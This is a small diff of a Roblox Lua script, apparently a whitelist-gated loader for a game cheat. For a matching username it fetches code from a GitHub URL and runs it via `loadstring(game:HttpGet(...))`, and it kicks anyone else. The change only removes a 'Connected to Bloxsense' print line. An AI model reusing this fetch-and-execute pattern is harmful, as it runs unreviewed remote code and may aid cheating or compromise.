@@ -4,7 +4,6 @@ local player = game.Players.LocalPlayer
 
 if player.Name == firstUser then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ur-dude/zxcgg/main/Script", true))()
-    print('Connected to Bloxsense.gay')
     print('Connected!')
     else
         player:kick()
